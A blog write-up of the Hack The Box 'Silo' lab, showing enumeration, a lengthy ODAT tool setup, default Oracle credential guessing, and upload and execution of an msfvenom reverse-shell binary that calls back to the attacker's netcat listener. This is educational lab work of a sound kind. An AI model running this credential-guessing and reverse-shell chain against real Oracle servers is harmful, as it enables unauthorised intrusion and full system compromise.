---
layout: post
title:  "Silo Writeup - Hack The Box"
date:   2025-05-18
desc: ""
keywords: "HTB,OSCP,Windows,Oracle,ODAT,Medium"
categories: [HTB]
tags: [HTB,OSCP,Windows,Oracle,ODAT,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/silo_writeup/Silo.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The **Silo** machine is a laboratory where one can face a single service and it does not mean that it will be **Easy**, as I had to struggle to configure my machine optimally to exploit the vulnerability. I found interesting all the previous steps before accessing the system, the **research**, the **installation**, the **troubleshooting** and **learning** how to use the tool to enumerate the vulnerable service. The box is rate as **Medium**, maybe because of all the work one has to do in the setup of the attacking machine. I'm super excited about this lab, so I'm going to signIn into **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** and spawn the box and get started.

<br /><br />
<img src="{{ site.img_path }}/silo_writeup/Silo_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform informs me that the machine is ready, I check with `ping` that I have connectivity through the **VPN** with the lab. Then with the tool `whichSystem.py` from **[Hack4u](https://hack4u.io/){:target="_blank"}** I validate the **OS** installed on the machine (**Windows** in this case) and I can use `nmap` to get the list of available ports, so I have an overview of the possible attack vectors (although I'm getting ahead of myself). Also `nmap` leaks me information of the services and their versions, to look for vulnerabilities later. With `crackmapexec` I check the **OS version** and other data (**signature** and **SMB version**), I also try to connect with `smbclient` and `smbmap` using the **SMB** protocol but I am not authorized, with `rpcclient` I have no luck either through **RPC**. With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I get very little information from the web service on port **80**.

```bash
ping -c 1 10.10.10.82
whichSystem.py 10.10.10.82
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.82 -oG allPorts
nmap -sCV -p80,135,139,445,1521,5985,47001,49152,49153,49154,49159,49160,49161,49162 10.10.10.82 -oN targeted
cat targeted

crackmapexec smb 10.10.10.82
smbclient -L 10.10.10.82 -N
smbmap -H 10.10.10.82 -u 'null' --no-banner
# :(

rpcclient -U "" 10.10.10.82 -N
cat ../nmap/targeted | grep http
whatweb http://10.10.10.82
```

<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

One of the services available on the machine is accessible from port **1521** and is for communicating with the **Oracle database**. There is an excellent tool on **Github** for **[pentesting to enumerate Oracle database](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-the-giant-how-odat-challenges-oracle-the-king-of-databases/){:target="_blank"}** by **[Quentin HARDY](https://github.com/quentinhardy/odat){:target="_blank"}**, so I just have to clone the project on my attacking machine and follow the steps on the project **Wiki** to install it. I also have to take into account the **OS architecture** of the **Silo** machine, very important to choose which **basic**, **sdk** (devel) and **sqlplus** clients to download, although with `crackmapexec` I get this information quickly.

> Port **1521** is the default TCP port used by **Oracle Database** for establishing communication between clients and the database server. It's the standard port for **Oracle's Transparent Network Substrate** (**TNS**) protocol, which handles client-server connections. This means that applications using **Oracle** databases typically connect to the database through this port.

> **[Oracle Database](https://docs.oracle.com/en/database/oracle/oracle-database/18/cncpt/introduction-to-oracle-database.html){:target="_blank"}** is an **RDBMS**. An **RDBMS** that implements object-oriented features such as user-defined types, inheritance, and polymorphism is called an object-relational database management system (**ORDBMS**). **Oracle Database** has extended the relational model to an object-relational model, making it possible to store complex business models in a relational database.

> **ODAT** is a Python-based tool that specifically **targets Oracle Database’s weaknesses** and **vulnerabilities**. It provides penetration testers, security researchers, and threat actors with a means to evaluate and exploit insecure configurations within Oracle databases. **ODAT** simplifies complex attack vectors and probes Oracle-specific protocols including **Transparent Network Substrate** (**TNS**) and exploits unpatched vulnerabilities (**CVEs**), or weak user credentials.

```bash
git clone https://github.com/quentinhardy/odat.git
git submodule init
git submodule update

crackmapexec smb 10.10.10.82
# x64
```

<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue with the configuration of the **ODAT** tool, now it is time to install all the necessary packages on my machine, and it is at this point where I have problems with the **[libaio1 package](https://packages.debian.org/bullseye/libaio1){:target="_blank"}**, with `apt-get` it does not allow me to install it, I can only download the package manually and install it with `dpkg`. Once the package problem is solved, I'm going to convert with `alien` the client packages, previously downloaded from **Oracle**, from **.rpm** to **.deb** to be able to install them with `dpkg`. Finally I have to create the necessary environment variables so that the **ODAT** tool knows where to find the binaries, libraries and whatever it needs to run, I have to be careful to place the correct version of **Oracle** installed on my machine.

```bash
sudo apt-get install libaio1 python3-dev alien python3-pip
# E: Package 'libaio1' has no installation candidate        :(
sudo apt-get install python3-dev alien python3-pip

mv /home/al3j0/Downloads/libaio1_0.3.112-9_amd64.deb .
sudo dpkg -i libaio1_0.3.112-9_amd64.deb
cd !$

mkdir installation
mv oracle-instantclient-* ./installation
cd !$
sudo alien --to-deb *
sudo dpkg -i *.deb
ls -l /usr/lib/oracle/
# 23 !!
nvim ~/.zshrc
```

<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I check that the `sqlplus` client works correctly, it is a good sign, but the problem now is in the `python` script `odat.py`, I need to install a library and the problems start. As some libraries are deprecated, it is only possible to install them in **Python** environment, so I'm going to configure one and continue with the installation using the binaries of the environment. After solving this first problem, other problems related to other libraries begin to concatenate, so I start my research on the **Internet** to solve each problem that arises installing a variety of libraries. Finally I can finish configuring the tool and the first thing I do is to **[enumerate by possible SIDs](https://github.com/quentinhardy/odat/wiki){:target="_blank"}**, but `odat.py` does not work correctly with this task unfortunately.

> In **Oracle Database**, an **SID** (**System Identifier**) is a unique name that identifies a specific **database instance** on a server. It's used internally by the **Oracle server** to distinguish between different database instances, particularly on the same host. While clients can connect using the **SID**, it's generally recommended to use **Service Names** (**TNS aliases**) for remote connections.

```bash
sqlplus
# :)
kill %
python3 odat.py --help
pip3 install cx_Oracle

python3 -m venv ./
./bin/python3 ./bin/pip3 install cx_Oracle
./bin/python3 odat.py --help
# :(
./bin/python3 ./bin/pip3 install colorlog termcolor pycrypto passlib python-libnmap
# :(

./bin/python3 ./bin/pip3 install Pyrebase4
./bin/python3 ./bin/pip3 install setuptools --upgrade
./bin/python3 ./bin/pip3 install colorlog termcolor passlib python-libnmap

./bin/python3 ./bin/pip3 install pycrypto
# Here is the problem :(

sudo apt-get install python3.13-dev
sudo apt-get install gcc
sudo apt-get install libxml2-dev libxslt1-dev
sudo apt-get install libssl-dev
sudo apt-get install libffi-dev
sudo apt-get install libjpeg-dev
sudo apt-get install libvirt-dev
sudo apt-get install libsqlite3-dev
sudo apt-get install libcurl4-openssl-dev
sudo apt-get install python3-scapy
sudo apt-get install build-essential python3-dev
./bin/python3 ./bin/pip3 install pycryptodome

./bin/python3 ./bin/pip3 install pycryptodomex
./bin/python3 ./bin/pip3 install pycryptodome-test-vectors
./bin/python3 -m Cryptodome.SelfTest
./bin/python3 ./bin/pip3 install pyasyncore

./bin/python3 odat.py --help
# :)
# sidguesser        to know valid SIDs

./bin/python3 odat.py sidguesser
./bin/python3 odat.py sidguesser -s 10.10.10.82
# :(
./bin/python3 ./bin/pip3 install scapy
./bin/python3 odat.py sidguesser -s 10.10.10.82
# :(
```

<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As the tool `oday.py` does not give me a correct **SID**, I'm going to use **XE** (community recommendation) since it is an instance present in most **Oracle databases**. With the **passwordguesser** utility I can investigate about valid credentials for this instance and after a long time of waiting I get them. There is also the possibility of creating a custom dictionary using one of **Metasploit** that is specific for **Oracle DB**, it is only necessary to make a small modification and then with the parameter **--accounts-file** I can indicate to the script the path of the dictionary that must use to guess the correct one.

> **Oracle Database Express Edition** (**XE**) is a free, full-featured version of **Oracle Database**, designed for individuals and organizations seeking to get started with Oracle technology without incurring licensing costs. It's a lightweight database that's easy to download, install, and manage. **XE** is suitable for developers, DBAs, data scientists, educators, and anyone curious about databases. 

```bash
./bin/python3 odat.py --help
# passwordguesser   to know valid credentials

./bin/python3 odat.py passwordguesser
./bin/python3 odat.py passwordguesser -s 10.10.10.82
./bin/python3 odat.py passwordguesser -s 10.10.10.82 -d XE
# scott/tiger

locate oracle_ | grep pass
cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | sed 's/ /\//' | head -n 5
# Or:
cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' | head -n 5

./bin/python3 odat.py passwordguesser -s 10.10.10.82 -d XE --help
# --accounts-file FILE                file containing Oracle credentials (default: accounts/accounts.txt)
```

<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have valid credentials for the **XE** instance, I follow the instructions available on the **[ODAT Wiki](https://github.com/quentinhardy/odat/wiki){:target="_blank"}** to authenticate and using the **--putFile** parameter I can upload a malicious file. With `msfvenom` I create an **.exe** binary that takes care of sending me a **Reverse Shell** when executed and with `odat.py` I succeed in uploading it without problems to the server.

```bash
./bin/python3 odat.py --help | grep utlfile | tail -n 1
# ./odat.py utlfile -s 192.168.1.254 -p 1521 -d ORCL -U scott -P tiger --sysdba --putFile 'C:/windows/temp/' shell.exe shell.exe

./bin/python3 odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --sysdba
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -f exe -o shell.exe
./bin/python3 odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --sysdba --putFile 'C:\Windows\Temp' oldb0yShell.exe ./shell.exe
```

<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Finally I can perform the last step to successfully engage the machine, thanks to the `odat.py` help panel I can get information about the utility that will allow me to access the malicious file and follow the necessary steps to execute it. I have problems for the execution because I don't have the necessary privileges, but using the **--sysdba** parameter can solve this problem. I just have to open a local port with `nc` waiting for the remote connection and run the `odat.py` tool with all the parameters and values set correctly to successfully engage the machine. As the compromised account is the one with maximum privileges I can access the two flags and enter them in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, rootead machine!

```bash
./bin/python3 odat.py --help
./bin/python3 odat.py externaltable
./bin/python3 odat.py externaltable -s 10.10.10.82
./bin/python3 odat.py externaltable -s 10.10.10.82 -d XE
./bin/python3 odat.py externaltable -s 10.10.10.82 -d XE -U scott -P tyger
./bin/python3 odat.py externaltable -s 10.10.10.82 -d XE -U scott -P tyger --exec --help

rlwrap -cAr nc -nlvp 443

./bin/python3 odat.py externaltable -s 10.10.10.82 -d XE -U scott -P tiger --exec 'C:\Windows\Temp\' oldb0yShell.exe
./bin/python3 odat.py externaltable -s 10.10.10.82 -d XE -U scott -P tiger --exec 'C:\Windows\Temp\' oldb0yShell.exe --sysdba
# :)

whoami
```

<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/silo_writeup/Silo_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another great **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, I had fun, I got frustrated, I spent a lot of time researching and testing different ways to configure the tool to exploit the vulnerability in the Database, but I learned a lot. I discovered a new technology that is widely used in real environments, which makes it very useful to know how to enumerate and look for possible bugs or misconfigurations. I kill this beautiful box and go for the next one.

<br /><br />
<img src="{{ site.img_path }}/silo_writeup/Silo_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
